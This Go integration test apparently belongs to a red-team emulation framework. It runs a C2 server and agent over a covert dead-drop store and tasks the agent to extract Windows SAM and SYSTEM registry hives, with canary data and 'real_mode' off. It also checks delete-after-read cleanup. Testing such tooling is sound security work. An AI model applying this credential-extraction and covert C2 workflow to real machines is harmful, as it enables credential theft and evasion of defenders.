package integration

import (
	"encoding/json"
	"fmt"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/ashwnn/adverse-go/internal/cryptokeys"
)

// TestInteropDrop runs the full C2 <-> agent workflow over the dead-drop
// transport ("living off trusted services"): both binaries exchange the same
// wire envelopes as opaque blobs through a WebDAV-style store instead of
// direct HTTPS. Scenario: register -> extract task (--wait) -> lifecycle
// verification -> reassembled hives -> noop -> signed kill.
func TestInteropDrop(t *testing.T) {
	secret, err := cryptokeys.Keygen()
	if err != nil {
		t.Fatalf("keygen: %v", err)
	}

	serverPort := freePort(t)
	serverAddr := fmt.Sprintf("127.0.0.1:%d", serverPort)
	serverURL := fmt.Sprintf("https://%s", serverAddr)

	// Start the fake drop store.
	storePort := freePort(t)
	storeAddr := fmt.Sprintf("127.0.0.1:%d", storePort)
	storeURL := fmt.Sprintf("http://%s", storeAddr)
	storeSrv := newDropStoreServer()
	ln, err := net.Listen("tcp", storeAddr)
	if err != nil {
		t.Fatalf("store listen: %v", err)
	}
	storeHTTPSrv := &http.Server{Handler: storeSrv}
	go storeHTTPSrv.Serve(ln)
	t.Cleanup(func() { storeHTTPSrv.Close() })

	testDir := t.TempDir()
	agentCfgPath := filepath.Join(testDir, "agent.json")
	stateDir := filepath.Join(testDir, "state")
	profilePath := filepath.Join(testDir, "profile.json")
	if err := os.MkdirAll(stateDir, 0o700); err != nil {
		t.Fatalf("mkdir state: %v", err)
	}

	// Generate agent config.
	cmd := exec.Command(adversedBin, "gen-agent",
		"--secret", secret, "--out", agentCfgPath, "--server-url", serverURL)
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("gen-agent: %v\n%s", err, out)
	}
	gdata, err := os.ReadFile(agentCfgPath)
	if err != nil {
		t.Fatalf("read agent cfg: %v", err)
	}
	var genCfg struct {
		AgentID string `json:"agent_id"`
	}
	if err := json.Unmarshal(gdata, &genCfg); err != nil {
		t.Fatalf("parse agent cfg: %v", err)
	}
	agentID := genCfg.AgentID
	t.Logf("agent_id=%s drop_store=%s", agentID, storeURL)

	// Switch the agent to the dead-drop transport.
	var cfg map[string]any
	if err := json.Unmarshal(gdata, &cfg); err != nil {
		t.Fatalf("unmarshal cfg: %v", err)
	}
	cfg["chunk_size"] = 4096
	cfg["min_delay_ms"] = 50
	cfg["max_delay_ms"] = 100
	cfg["tls_skip_verify"] = true
	cfg["hives"] = []string{"SYSTEM", "SAM"}
	cfg["real_mode"] = false
	cfg["transport"] = map[string]any{
		"mode": "drop",
		"drop": map[string]any{
			"store":              "http",
			"base_url":           storeURL,
			"dir":                "agents",
			"poll_interval_s":    1,
			"response_timeout_s": 30,
		},
	}
	edited, err := json.MarshalIndent(cfg, "", "  ")
	if err != nil {
		t.Fatalf("marshal cfg: %v", err)
	}
	if err := os.WriteFile(agentCfgPath, edited, 0o600); err != nil {
		t.Fatalf("write cfg: %v", err)
	}

	// Server profile: HTTPS listener (admin API) + enabled drop collector.
	profData := []byte(fmt.Sprintf(`{
		"name":"lab",
		"beacon_interval_s":1,
		"beacon_jitter_s":0,
		"drop":{"enabled":true,"store":"http","base_url":%q,"dir":"agents","poll_interval_s":1}
	}`, storeURL))
	if err := os.WriteFile(profilePath, profData, 0o600); err != nil {
		t.Fatalf("write profile: %v", err)
	}

	operatorTokenPath := filepath.Join(testDir, "operator.token")
	if err := os.WriteFile(operatorTokenPath, []byte("drop-interop-token\n"), 0o600); err != nil {
		t.Fatalf("write operator token: %v", err)
	}

	// Start the server.
	serverCmd := exec.Command(adversedBin, "serve",
		"--secret", secret,
		"--listen", serverAddr,
		"--profile", profilePath,
		"--state-dir", stateDir,
		"--operator-token-file", operatorTokenPath,
	)
	serverCmd.Stdout = os.Stderr
	serverCmd.Stderr = os.Stderr
	setSysProcAttr(serverCmd)
	if err := serverCmd.Start(); err != nil {
		t.Fatalf("start server: %v", err)
	}
	t.Cleanup(func() { killProcess(serverCmd) })
	waitForTCP(t, serverAddr, 10*time.Second)

	// Start the agent (drop transport).
	agentCmd := exec.Command(registryfilBin,
		"--config", agentCfgPath, "--dry-run=false")
	agentCmd.Stdout = os.Stderr
	agentCmd.Stderr = os.Stderr
	agentCmd.Dir = testDir
	setSysProcAttr(agentCmd)
	agentCmd.Env = append(os.Environ(), "ADVERSE_BEHAVIOURAL=0")
	if err := agentCmd.Start(); err != nil {
		t.Fatalf("start agent: %v", err)
	}
	t.Cleanup(func() { killProcess(agentCmd) })

	// Registration arrives via the drop channel.
	statePath := filepath.Join(stateDir, "state.json")
	waitForCondition(t, 30*time.Second, func() (bool, string) {
		if _, err := os.Stat(statePath); err != nil {
			return false, "state.json not yet written"
		}
		s := readState(t, statePath)
		if _, ok := s.Agents[agentID]; !ok {
			return false, fmt.Sprintf("agent %s not registered (agents=%v)", agentID, keysOf(s.Agents))
		}
		return true, ""
	})
	t.Logf("agent registered over drop transport")

	// Operator API still works over HTTPS.
	statusCmd := exec.Command(adversedBin, "status",
		"--server", serverURL, "--token-file", operatorTokenPath)
	if out, err := statusCmd.CombinedOutput(); err != nil {
		t.Fatalf("status: %v\n%s", err, out)
	} else {
		t.Logf("status: %s", strings.TrimSpace(string(out)))
	}

	// Extract task with --wait (queued -> dispatched -> acked -> completed).
	taskCmd := exec.Command(adversedBin, "task",
		"--server", serverURL, "--token-file", operatorTokenPath,
		"--agent", agentID,
		"--action", "extract",
		"--hives", "SYSTEM,SAM",
		"--wait", "--timeout", "90s",
	)
	taskOut, err := taskCmd.CombinedOutput()
	if err != nil {
		t.Fatalf("task: %v\n%s", err, taskOut)
	}
	jobID := parseTaskID(t, string(taskOut))
	t.Logf("extract task %s completed over drop transport", jobID)

	// Lifecycle: completed and acked.
	tasksJSON := runTasksJSON(t, adversedBin, serverURL, operatorTokenPath, agentID)
	var taskInfos []taskInfoJSON
	if err := json.Unmarshal(tasksJSON, &taskInfos); err != nil {
		t.Fatalf("parse tasks json: %v", err)
	}
	found := false
	for _, ti := range taskInfos {
		if ti.ID != jobID {
			continue
		}
		found = true
		if ti.State != "completed" || ti.AckedAt == "" {
			t.Fatalf("task %s lifecycle wrong: %+v", jobID, ti)
		}
	}
	if !found {
		t.Fatalf("task %s not found", jobID)
	}

	// Reassembled hives from the server (chunks arrived via drop).
	outDir := filepath.Join(testDir, "reassembled")
	resultsCmd := exec.Command(adversedBin, "results",
		"--server", serverURL, "--token-file", operatorTokenPath,
		"--agent", agentID, "--task", jobID, "--out", outDir)
	if out, err := resultsCmd.CombinedOutput(); err != nil {
		t.Fatalf("results: %v\n%s", err, out)
	}
	entries, err := os.ReadDir(outDir)
	if err != nil || len(entries) < 2 {
		t.Fatalf("expected >=2 reassembled hives, got %d (err=%v)", len(entries), err)
	}
	for _, e := range entries {
		data, err := os.ReadFile(filepath.Join(outDir, e.Name()))
		if err != nil {
			t.Fatal(err)
		}
		if string(data[:4]) != "regf" || !strings.Contains(string(data), "CANARY") {
			t.Fatalf("hive %s: bad contents", e.Name())
		}
	}

	// Noop via drop.
	noopCmd := exec.Command(adversedBin, "task",
		"--server", serverURL, "--token-file", operatorTokenPath,
		"--agent", agentID, "--action", "noop", "--wait", "--timeout", "60s")
	if out, err := noopCmd.CombinedOutput(); err != nil {
		t.Fatalf("noop: %v\n%s", err, out)
	}
	t.Logf("noop task completed over drop transport")

	// Kill via drop: agent exits 0.
	killCmd := exec.Command(adversedBin, "kill",
		"--server", serverURL, "--token-file", operatorTokenPath,
		"--agent", agentID)
	if out, err := killCmd.CombinedOutput(); err != nil {
		t.Fatalf("kill: %v\n%s", err, out)
	}
	done := make(chan int, 1)
	go func() {
		err := agentCmd.Wait()
		if err != nil {
			if exitErr, ok := err.(*exec.ExitError); ok {
				done <- exitErr.ExitCode()
				return
			}
			done <- -1
			return
		}
		done <- 0
	}()
	select {
	case code := <-done:
		if code != 0 {
			t.Fatalf("agent exited %d, want 0", code)
		}
		t.Logf("agent exited 0 (kill accepted over drop transport)")
	case <-time.After(30 * time.Second):
		t.Fatal("agent did not exit within 30s of kill")
	}

	// Hygiene: the drop store holds no blobs after the run.
	if remaining := storeSrv.blobCount(); remaining != 0 {
		t.Fatalf("drop store not cleaned: %d blobs remain", remaining)
	}
	t.Logf("drop store empty after run (delete-after-read verified)")
}
